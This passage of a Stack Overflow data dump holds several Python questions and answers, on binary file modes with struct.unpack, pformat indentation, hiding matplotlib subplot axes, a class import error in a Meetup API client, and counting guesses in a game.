"link": "https://stackoverflow.com/questions/29397827/python-error-on-struct-unpack/29397936#29397936", "title": "python error on struct.unpack", "body": "<p>You have opened a binary file in text mode, and you are using an operating system where the distinction matters. Try adding <code>b</code> to the mode parameter when you open the file:</p>\n\n<pre><code>f = open(\"my_input_file.bin\", \"rb\")\n</code></pre>\n"}], "owner": {"reputation": 123, "user_id": 4738702, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/f12b60577cc697726337b70c0c4e64cc?s=128&d=identicon&r=PG&f=1", "display_name": "Mark Aisenberg", "link": "https://stackoverflow.com/users/4738702/mark-aisenberg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 262, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1427912245, "creation_date": 1427911869, "last_edit_date": 1427912055, "question_id": 29397827, "link": "https://stackoverflow.com/questions/29397827/python-error-on-struct-unpack", "title": "python error on struct.unpack", "body": "<p>I am new to python and I am trying to use unpack like this:</p>\n\n<pre><code>data = f.read(4)\nAAA=len(data)\nBBB=struct.calcsize(cformat)\nprint AAA\nprint BBB\nvalue = struct.unpack(cformat, data)\nreturn value[0]\n</code></pre>\n\n<p>This runs fine as long as AAA == BBB but sometimes, f.read only reads 3 bytes and then I get an error.  The actual value in the file that I am trying to read is 26.  It reads all of the values from 1-221 except for 26 where it errors because f.read(size) only reads three bytes</p>\n"}, {"tags": ["python", "python-3.x", "pprint"], "answers": [{"comments": [{"owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1427917397, "post_id": 29398080, "comment_id": 46974682, "body": "Try this: <code>print(pp.pformat({1:11, 2:22, 3:33}, indent=0, width=1))</code>, with <code>indent</code> going from 0 to 2. You ll notice, it applies one less whitespace on the first line. It is the way <code>pformat()</code> is built."}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1427920786, "post_id": 29398080, "comment_id": 46976524, "body": "@user5061 Did you try using my Python code though? I was able to fix your problem with just a space."}], "tags": [], "owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "is_accepted": false, "score": 1, "last_activity_date": 1427921607, "last_edit_date": 1427921607, "creation_date": 1427912744, "answer_id": 29398080, "question_id": 29397777, "link": "https://stackoverflow.com/questions/29397777/indentation-of-pformat-output/29398080#29398080", "title": "Indentation of pformat() output", "body": "<p>The <strong>parameters</strong> are not the issue with your printing. The problem occurs when you add newlines (<code>'\\n'</code>). As you can see from this example:</p>\n\n<pre><code>import pprint    \n\ndef f(obj_name, obj_body_as_dct):\n\n    body = '{' + pprint.pformat(obj_body_as_dct, indent=4, width=1, depth=1)[1:]\n    name_and_equal_sign = obj_name + ' = ' + '\\n'\n\n    return '\"\"\"' + name_and_equal_sign + body + '\"\"\"' + '\\n\\n'\n\n\nd = {1: 11, 2: 22, 3: 33}\n\nprint(f('MY_DCT', d))\n</code></pre>\n\n<p>This outputs:</p>\n\n<pre><code>\"\"\"MY_DCT = \n{   1: 11,\n    2: 22,\n    3: 33}\"\"\"\n</code></pre>\n\n<p>The newlines, and the addition of a '<code>{</code>' in the first row of printing is why only the first row of your output seems to be offset by a small space. </p>\n\n<p><strong>UPDATE #1</strong>: </p>\n\n<p>After a bit of tinkering with these values, I was able to match your desired output:</p>\n\n<pre><code>import pprint    \n\ndef f(obj_name, obj_body_as_dct):\n\n    body = pprint.pformat(obj_body_as_dct, indent=4, width=1, depth=1)[1:]\n    name_and_equal_sign = obj_name \n\n    return '\"\"\"' + name_and_equal_sign + ' = ' + '{' + '\\n ' + body +'\"\"\"'  + '\\n\\n'  \n                                                        # ^ I added a space in this newline\n\nd = {1: 11, 2: 22, 3: 33}\n\nprint(f('MY_DCT', d))\n</code></pre>\n\n<p>The above code outputs:</p>\n\n<pre><code>\"\"\"MY_DCT = { \n    1: 11,\n    2: 22,\n    3: 33}\"\"\"\n</code></pre>\n\n<p>So, in essence, you just needed one space in a newline character (shown in code).  </p>\n\n<p><strong>UPDATE #2</strong>:</p>\n\n<p>Following your suggestion in the comments:</p>\n\n<blockquote>\n  <p>Try this: <code>print(pp.pformat({1:11, 2:22, 3:33}, indent=0, width=1))</code>,\n  with indent going from 0 to 2. You ll notice, it applies one less\n  whitespace on the first line. It is the way <code>pformat()</code> is built. -@user 5061</p>\n</blockquote>\n\n<p>I tried this:</p>\n\n<pre><code>import pprint as pp\n\nfor i in range(0,3):\n    print(pp.pformat({1:11, 2:22, 3:33}, indent=i, width=1))\n</code></pre>\n\n<p>And it gave me this output:</p>\n\n<pre><code>{1: 11,     #Indent = 0 Each entry (except 1) is indented by 0 spaces, because the \"{\" operator is in the way. \n2: 22,\n3: 33}\n{1: 11,     #Indent = 1 Each entry is indented by 1 spaces\n 2: 22,\n 3: 33}\n{ 1: 11,    #Indent = 2 Each entry is indented by 2 spaces\n  2: 22,\n  3: 33}\n</code></pre>\n\n<p>As you can see, the problem is still with this:  \"<code>{</code>\"<br>\nIf that wasn't there, then the indents would be even throughout. The function <code>pformat()</code> was coded to adjust for that character.</p>\n"}, {"comments": [{"owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1427915277, "post_id": 29398197, "comment_id": 46973564, "body": "The string will be inserted in a <code>.py</code> file. This output would be invalid syntax."}, {"owner": {"reputation": 24066, "user_id": 4686625, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gsGGS.jpg?s=128&g=1", "display_name": "miradulo", "link": "https://stackoverflow.com/users/4686625/miradulo"}, "reply_to_user": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1427915348, "post_id": 29398197, "comment_id": 46973601, "body": "@user5061 Your desired output is <i>exactly</i> as shown in your first display? I can edit if so, and place in a string."}, {"owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1427915765, "post_id": 29398197, "comment_id": 46973817, "body": "Your output is <i>not</i> the same as the one i have in my question. If you copy that output, and insert it in a py file, you would get a syntax error."}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1427915801, "post_id": 29398197, "comment_id": 46973838, "body": "@user5061 I formatted my code to get you a string ;) (got you covered)"}, {"owner": {"reputation": 24066, "user_id": 4686625, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gsGGS.jpg?s=128&g=1", "display_name": "miradulo", "link": "https://stackoverflow.com/users/4686625/miradulo"}, "reply_to_user": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "edited": false, "score": 0, "creation_date": 1427916375, "post_id": 29398197, "comment_id": 46974120, "body": "@user5061 I understand what you mean, you wanted to put it literally in a .py file. Edited to do so, please see updated answer"}], "tags": [], "owner": {"reputation": 24066, "user_id": 4686625, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gsGGS.jpg?s=128&g=1", "display_name": "miradulo", "link": "https://stackoverflow.com/users/4686625/miradulo"}, "is_accepted": false, "score": 0, "last_activity_date": 1427916326, "last_edit_date": 1427916326, "creation_date": 1427913115, "answer_id": 29398197, "question_id": 29397777, "link": "https://stackoverflow.com/questions/29397777/indentation-of-pformat-output/29398197#29398197", "title": "Indentation of pformat() output", "body": "<p><a href=\"https://stackoverflow.com/users/4669462/logic\">Logic's answer</a> has you covered as to why you are having the indentation issue. As (<em>IMO</em>) a more concise approach however, you can make use of <a href=\"https://docs.python.org/2/library/json.html\" rel=\"nofollow\"><code>json</code></a>. This output is assuming that by <em>elements</em> you mean dictionary elements:</p>\n\n<pre><code>import json\nobj_name = 'MY_DCT = '\nobj_body_as_dct = {1: 11, 2: 22, 3: 33}\n\nstringy = \"\\\"\\\"\\\"\" + obj_name + \"{\" \\\n          + str(json.dumps(obj_body_as_dct, indent=4, separators=(',', ': ')))[1:] + \"\\\"\\\"\\\"\"\nprint(stringy)\n</code></pre>\n\n<p><strong>Outputs:</strong></p>\n\n<pre><code>\"\"\"MY_DCT = {\n    \"1\": 11,\n    \"2\": 22,\n    \"3\": 33\n}\"\"\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "is_accepted": true, "score": 4, "last_activity_date": 1428315656, "creation_date": 1428315656, "answer_id": 29469358, "question_id": 29397777, "link": "https://stackoverflow.com/questions/29397777/indentation-of-pformat-output/29469358#29469358", "title": "Indentation of pformat() output", "body": "<p>The default value of <code>indent</code> in <code>pformat</code> is 1, so that keys appear one under the other. </p>\n\n<p>For example, <code>pformat(d, indent=0, width=1)</code> would result in this string:</p>\n\n<pre><code>{1: 11,\n2: 22,\n3: 33}\n</code></pre>\n\n<p><code>indent=1</code>: </p>\n\n<pre><code>{1: 11,\n 2: 22,\n 3: 33}\n</code></pre>\n\n<p>and <code>indent=2</code>: </p>\n\n<pre><code>{ 1: 11,\n  2: 22,\n  3: 33}\n</code></pre>\n\n<p>One less whitespace always on the first line. </p>\n\n<hr>\n\n<p>Since the goal was to display dict elements after the first line, and have all elements indented by 4 spaces, adding a single whitespace before the first element and using <code>indent=4</code> would work for some dicts (as suggested by @logic). </p>\n\n<p>However dicts like <code>d = {1: {'a': 1, 'b': 2}, 2: 22, 3: 33}</code> would look rather ugly, since <code>indent</code> would affect the appearance of dicts with depth greater than 1 as well:  </p>\n\n<pre><code>MY_DCT = {\n    1: {   'a': 1,\n           'b': 2},\n    #    ^\n    #    |\n    # ugly\n    2: 22,\n    3: 33}\n</code></pre>\n\n<hr>\n\n<p>The most appealing solution (for the data i m working on) is keeping <code>indent=1</code> and adding 3 whitespaces for first element, and 4 whitespaces for the rest. </p>\n\n<pre><code>def f(obj_name, given_dct):\n    \"\"\"\n    Converts given dct (body) to a pretty formatted string.\n    Resulting string used for file writing.\n\n    Args:\n        obj_name: (str) name of the dict\n    Returns:\n        (str)\n    \"\"\"\n\n    string = pp.pformat(given_dct, width=1)[1:]\n\n    new_str = ''\n    for num, line in enumerate(string.split('\\n')):\n        if num == 0:\n            # (pprint module always inserts one less whitespace for first line)\n            # (indent=1 is default, giving everything one extra whitespace)\n            new_str += ' '*4 + line + '\\n'\n        else:\n            new_str += ' '*3 + line + '\\n'\n\n    return obj_name + ' = {\\n' + new_str\n\n\ns = f(obj_name='MY_DCT', given_dct=d)\n</code></pre>\n\n<p>Resulting in this string: </p>\n\n<pre><code>MY_DCT = {\n    1: {'a': 'aa',\n        'b': [1,\n              2,\n              3]},\n    2: 22,\n    3: 33}\n</code></pre>\n"}], "owner": {"reputation": 4374, "user_id": 4230591, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/fb9061bc5222a66bf8a757ffac9e5e67?s=128&d=identicon&r=PG&f=1", "display_name": "user", "link": "https://stackoverflow.com/users/4230591/user"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5697, "favorite_count": 0, "accepted_answer_id": 29469358, "answer_count": 3, "score": 3, "last_activity_date": 1428315656, "creation_date": 1427911695, "last_edit_date": 1428315486, "question_id": 29397777, "link": "https://stackoverflow.com/questions/29397777/indentation-of-pformat-output", "title": "Indentation of pformat() output", "body": "<p>I have a function that uses <a href=\"https://docs.python.org/3.4/library/pprint.html?highlight=pformat#pprint.pformat\" rel=\"nofollow\"><code>pformat()</code></a> to convert a dictionary to a string (<em>irrelevant</em>: string will be later inserted with <code>write()</code> in a <code>.py</code> file). </p>\n\n<p>So <code>MY_DCT = {1: 11, 2: 22, 3: 33}</code> would become a string like this:</p>\n\n<pre><code>MY_DCT = {\n    1: 11,\n    2: 22,\n    3: 33}\n</code></pre>\n\n<p>There are 2 requirements for the function: </p>\n\n<ol>\n<li>Dict items must be displayed after the first line. </li>\n<li>Elements have to be indented by 4 whitespaces.</li>\n</ol>\n\n<p>Here is the function: </p>\n\n<pre><code>import pprint    \n\ndef f(obj_name, obj_body_as_dct):\n\n    body = '{\\n' + pprint.pformat(obj_body_as_dct, indent=4, width=1)[1:]\n    name_and_equal_sign = obj_name + ' = '\n\n    return name_and_equal_sign + body + '\\n\\n'\n\n\nd = {1: 11, 2: 22, 3: 33}\n\nprint(f('MY_DCT', d))\n</code></pre>\n\n<p>If <code>indent=0</code> i get this string: </p>\n\n<pre><code>MY_DCT = {\n1: 11,\n2: 22,\n3: 33}\n</code></pre>\n\n<p>If <code>indent=4</code> i get this string: </p>\n\n<pre><code>MY_DCT = {\n   1: 11,\n    2: 22,\n    3: 33}\n</code></pre>\n\n<p>I checked the <a href=\"https://docs.python.org/3.4/library/pprint.html?highlight=pformat#pprint.PrettyPrinter\" rel=\"nofollow\">parameters</a> of <code>pformat()</code> but i couldn't figure out how to make the correct number of whitespaces appear on each line. </p>\n\n<p>I know i can use <code>replace()</code>, <code>+' '</code> etc., to fix the string, but i m wondering where does that extra whitespace come from and if i can get rid of it by setting correctly the parameters (if that is even possible, that is). </p>\n\n<p><em>Note:</em> If there is a better way to achieve the above, do let me know. </p>\n"}, {"tags": ["python", "matplotlib"], "answers": [{"comments": [{"owner": {"reputation": 2403, "user_id": 3190054, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/b7de233f9b761d1d0d75d64b608aca88?s=128&d=identicon&r=PG&f=1", "display_name": "kezzos", "link": "https://stackoverflow.com/users/3190054/kezzos"}, "edited": false, "score": 0, "creation_date": 1427913131, "post_id": 29398114, "comment_id": 46972327, "body": "ah brilliant, something simple!"}], "tags": [], "owner": {"reputation": 3061, "user_id": 3111778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/41dcac65aa74e53542af5edd4ff653d2?s=128&d=identicon&r=PG&f=1", "display_name": "pyan", "link": "https://stackoverflow.com/users/3111778/pyan"}, "is_accepted": true, "score": 2, "last_activity_date": 1427912844, "creation_date": 1427912844, "answer_id": 29398114, "question_id": 29397763, "link": "https://stackoverflow.com/questions/29397763/how-to-remove-matplotlib-axis-from-multiple-plots/29398114#29398114", "title": "How to remove matplotlib axis from multiple plots?", "body": "<p>You need to turn off the axis for each subplot. Try the following code and see if it is what you want.</p>\n\n<pre><code>import numpy as np\nimport matplotlib.pyplot as plt\n\narray_list = [np.random.random_integers(0, i, (5,5)).astype(bool) for i in range(10)]\n\ncount = 0    \nfig, axes = plt.subplots(nrows=2, ncols=5)\nfor i in range(2):\n    for j in range(5):\n        axes[i, j].imshow(array_list[count], interpolation='nearest')\n        count += 1\n        axes[i, j].axis('off')\nplt.show()\n</code></pre>\n"}], "owner": {"reputation": 2403, "user_id": 3190054, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/b7de233f9b761d1d0d75d64b608aca88?s=128&d=identicon&r=PG&f=1", "display_name": "kezzos", "link": "https://stackoverflow.com/users/3190054/kezzos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 422, "favorite_count": 0, "accepted_answer_id": 29398114, "answer_count": 1, "score": 0, "last_activity_date": 1427912844, "creation_date": 1427911654, "question_id": 29397763, "link": "https://stackoverflow.com/questions/29397763/how-to-remove-matplotlib-axis-from-multiple-plots", "title": "How to remove matplotlib axis from multiple plots?", "body": "<p>I have multiple subplots but I cant seem to remove the axis from all of the plots, only one of them. What is the best way to do this?</p>\n\n<pre><code>import numpy as np\nimport matplotlib.pyplot as plt\n\narray_list = [np.random.random_integers(0, i, (5,5)).astype(bool) for i in range(10)]\n\ncount = 0    \nfig, axes = plt.subplots(nrows=2, ncols=5)\nfor i in range(2):\n    for j in range(5):\n        axes[i, j].imshow(array_list[count], interpolation='nearest')\n        count += 1\nplt.axis('off')\nplt.show()\n</code></pre>\n"}, {"tags": ["python", "class", "memcached"], "answers": [{"comments": [{"owner": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "edited": false, "score": 0, "creation_date": 1427913446, "post_id": 29398107, "comment_id": 46972512, "body": "I don&#39;t see a meetupapi.pyc file. I&#39;m I completely doing the import wrong?"}, {"owner": {"reputation": 2042, "user_id": 1591302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e263226d58575fe11998293a36a1061e?s=128&d=identicon&r=PG", "display_name": "paidhima", "link": "https://stackoverflow.com/users/1591302/paidhima"}, "reply_to_user": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "edited": false, "score": 0, "creation_date": 1427913990, "post_id": 29398107, "comment_id": 46972831, "body": "Now that I look at it, your module is in the bin/lib directory.  I wouldn&#39;t expect you to be able to import it the way you have.  Is there a meetupapi.py file in your bin directory as well, by chance?"}, {"owner": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "edited": false, "score": 0, "creation_date": 1427914176, "post_id": 29398107, "comment_id": 46972929, "body": "No...Again, I&#39;m new to this so I read another post that said to create an <b>init</b>.py file in the bin directory with: from lib.meetupapi import MeetupAPI"}, {"owner": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "edited": false, "score": 0, "creation_date": 1427914749, "post_id": 29398107, "comment_id": 46973260, "body": "Ok...so I moved it into the bin folder and it doesn&#39;t get the attribute error anymore. Now I&#39;m just getting a urllib2 not defined error. I added the urllib2 import to the class, but it still has the error. It&#39;s also creating the .pyc file."}, {"owner": {"reputation": 2042, "user_id": 1591302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e263226d58575fe11998293a36a1061e?s=128&d=identicon&r=PG", "display_name": "paidhima", "link": "https://stackoverflow.com/users/1591302/paidhima"}, "reply_to_user": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "edited": false, "score": 0, "creation_date": 1427915396, "post_id": 29398107, "comment_id": 46973630, "body": "Are you doing this in Python 2 or Python 3?  There is no urllib2 in Python3."}, {"owner": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "edited": false, "score": 0, "creation_date": 1427920557, "post_id": 29398107, "comment_id": 46976419, "body": "I fixed that part. I&#39;m using python 2.7. I had put the imports in the class for json and urllib2. Once I moved them to the top of the file, before the class, everything started working like its supposed to. Thanks for all your help."}, {"owner": {"reputation": 2042, "user_id": 1591302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e263226d58575fe11998293a36a1061e?s=128&d=identicon&r=PG", "display_name": "paidhima", "link": "https://stackoverflow.com/users/1591302/paidhima"}, "reply_to_user": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "edited": false, "score": 0, "creation_date": 1427920776, "post_id": 29398107, "comment_id": 46976519, "body": "No problem.  As a rule, I try to keep imports at the top of the module.  This way I can avoid calling an imported resource before I&#39;ve actually done the import.  Not sure if that was your issue, but it&#39;s a good thing to consider."}], "tags": [], "owner": {"reputation": 2042, "user_id": 1591302, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e263226d58575fe11998293a36a1061e?s=128&d=identicon&r=PG", "display_name": "paidhima", "link": "https://stackoverflow.com/users/1591302/paidhima"}, "is_accepted": true, "score": 0, "last_activity_date": 1427912814, "creation_date": 1427912814, "answer_id": 29398107, "question_id": 29397758, "link": "https://stackoverflow.com/questions/29397758/python-class-import-attribute-not-found/29398107#29398107", "title": "Python class import attribute not found", "body": "<p>Check the lib directory for meetupapi.pyc (note the \"c\") and delete it.  Then try importing the module again.  Modules are compiled to bytecode when imported.  If you modify the file a new compile <em>should</em> have been done automatically, but perhaps not.</p>\n"}], "owner": {"reputation": 197, "user_id": 4739397, "user_type": "registered", "accept_rate": 82, "profile_image": "https://lh3.googleusercontent.com/-LXL6W2a4rC4/AAAAAAAAAAI/AAAAAAAAAEY/g8tMOvK4dQM/photo.jpg?sz=128", "display_name": "Justin Boucher", "link": "https://stackoverflow.com/users/4739397/justin-boucher"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1477, "favorite_count": 0, "accepted_answer_id": 29398107, "answer_count": 1, "score": 0, "last_activity_date": 1427912814, "creation_date": 1427911626, "last_edit_date": 1427912026, "question_id": 29397758, "link": "https://stackoverflow.com/questions/29397758/python-class-import-attribute-not-found", "title": "Python class import attribute not found", "body": "<p>I am new to python and I'm trying to create a very simple API call to a REST service. I need this data in order to import it into another application that only supports python. My issue is that I created a python class and tried to import it into my application. I had several mistakes, and then modified my class file including adding a new function called parse_json. When I run my application now it says that the object has no attribute parse_json. When I run the code directly in the class it works, but running from a separate file and importing the class gives me the error above.</p>\n\n<p>../bin/lib/meetupapi.py -> My class file</p>\n\n<pre><code>class MeetupAPI(object):\n\n    BASE_URL = 'https://api.meetup.com'\n\n    def __init__(self, request_uri, api_key, group_urlname):\n        self.request_uri = request_uri\n        self.api_key = api_key\n        self.group_urlname = group_urlname\n\n\n    # Parse JSON query from API Call\n    def parse_json(self, url, result_type=0):\n        self.url = url\n        self.result_type = result_type\n\n        self.json_obj = urllib2.urlopen(self.url)\n        self.data = json.load(self.json_obj)\n        if result_type is not 0:\n            if self.data[result_type]:\n                return json.dumps(self.data[result_type])\n        else:\n            return json.dumps(self.data)\n\n\n    # Get member IDs for profile\n    def get_mid(self, request_type):\n        self.request_type = request_type\n\n        if self.request_type == 'member':\n            self.url = MeetupAPI.BASE_URL + '/2/members?key=' + \\\n                self.api_key + '&amp;group_urlname=' + self.group_urlname\n        elif self.request_type == 'event':\n            url = MeetupAPI.BASE_URL + '/2/events?key=' + \\\n                self.api_key + '&amp;group_urlname=' + self.group_urlname\n\n        self.json_obj = urllib2.urlopen(self.url)\n        self.data = json.load(self.json_obj)\n        self.mids = []\n\n        for self.item in self.data['results']:\n            if self.item['id']:\n                self.mids.extend([self.item['id']])\n\n        return self.mids\n\n    # Get Group IDs for reference\n    def get_gid(self):\n        self.url = MeetupAPI.BASE_URL + '/' + \\\n            self.group_urlname + '?key=' + self.api_key\n\n        return self.url\n\n    # Main Meetup API Query for group based information\n    def query(self):\n        self.url = MeetupAPI.BASE_URL + self.request_uri + '?key=' + \\\n            self.api_key + '&amp;group_urlname=' + self.group_urlname\n\n        return self.url\n\n    # Get member or event profile information\n    def profile(self,mid,gid):\n        self.mid = mid\n        self.gid = gid\n\n        self.url = MeetupAPI.BASE_URL + '/2/profile/' + \\\n            str(self.gid) + '/' + \\\n            str(self.mid) + '?key=' + self.api_key\n\n        return self.url\n</code></pre>\n\n<p>../bin/test.py -> my test file</p>\n\n<pre><code># Import required libraries\nfrom meetupapi import MeetupAPI\n\nMeetup = MeetupAPI(\n    '/2/members',\n    'xxxxxxx',\n    'xxxxxxx'\n)\nmids = Meetup.get_mid('member')\ngroup = Meetup.get_gid()\ngid = Meetup.parse_json(group, 'id')\n\nfor mid in mids:\n    member = Meetup.profile(mid, gid)\n    profile = Meetup.parse_json(member)\n    print profile\n</code></pre>\n\n<p>Error when running</p>\n\n<pre><code>Traceback (most recent call last):\n  File \"./test2.py\", line 25, in &lt;module&gt;\n    gid = Meetup.parse_json(group, 'id')\nAttributeError: 'MeetupAPI' object has no attribute 'parse_json'\n</code></pre>\n\n<p>Please keep in mind that I have never written a class in python before, so I'm probably missing something really easy. I've looked at all the answers provided for others that I could find, but nothing seemed to fit. Any help you could provide would be greatly appreciated.</p>\n"}, {"tags": ["python", "count", "dice"], "comments": [{"owner": {"reputation": 2289, "user_id": 1664675, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e9526be62369d44940cded06d9b1f7f8?s=128&d=identicon&r=PG", "display_name": "letsc", "link": "https://stackoverflow.com/users/1664675/letsc"}, "edited": false, "score": 0, "creation_date": 1427911945, "post_id": 29397736, "comment_id": 46971735, "body": "fix your indentation. the <code>if</code> statements under <code>while</code> need to be moved my one tab space"}], "answers": [{"comments": [{"owner": {"reputation": 2289, "user_id": 1664675, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e9526be62369d44940cded06d9b1f7f8?s=128&d=identicon&r=PG", "display_name": "letsc", "link": "https://stackoverflow.com/users/1664675/letsc"}, "edited": false, "score": 0, "creation_date": 1427912051, "post_id": 29397851, "comment_id": 46971789, "body": "Or use a dictionary to see which number was guessed the most number of time"}], "tags": [], "owner": {"reputation": 40039, "user_id": 699224, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/4feb08afcd7c57acb72bd49fc2bf834d?s=128&d=identicon&r=PG", "display_name": "DNA", "link": "https://stackoverflow.com/users/699224/dna"}, "is_accepted": false, "score": 0, "last_activity_date": 1427911950, "creation_date": 1427911950, "answer_id": 29397851, "question_id": 29397736, "link": "https://stackoverflow.com/questions/29397736/python-guessing-game-counting-number-of-guesses/29397851#29397851", "title": "Python guessing game, counting number of guesses", "body": "<p>To detect repeated guesses, we have to keep track of all the previous guesses.</p>\n\n<p>We only need to know if a particular number has been guessed before - not how many times it has come up. </p>\n\n<p>This is the perfect place for using a <code>set</code> (see the <a href=\"https://docs.python.org/2/library/stdtypes.html#set-types-set-frozenset\" rel=\"nofollow\">Python docs</a>).</p>\n\n<p>Begin with an empty set (rather than beginning with <code>guess_number = 1</code>), then add each guess to this set.</p>\n\n<p>Once the person has guessed correctly, you can check the size of the set - this is the number of guesses, ignoring duplicates.</p>\n"}, {"comments": [{"owner": {"reputation": 616, "user_id": 1921715, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/J9b63.png?s=128&g=1", "display_name": "Alexey Gorozhanov", "link": "https://stackoverflow.com/users/1921715/alexey-gorozhanov"}, "edited": false, "score": 0, "creation_date": 1427913919, "post_id": 29398100, "comment_id": 46972794, "body": "The code was improved, now is counts only different tries including the last one."}], "tags": [], "owner": {"reputation": 616, "user_id": 1921715, 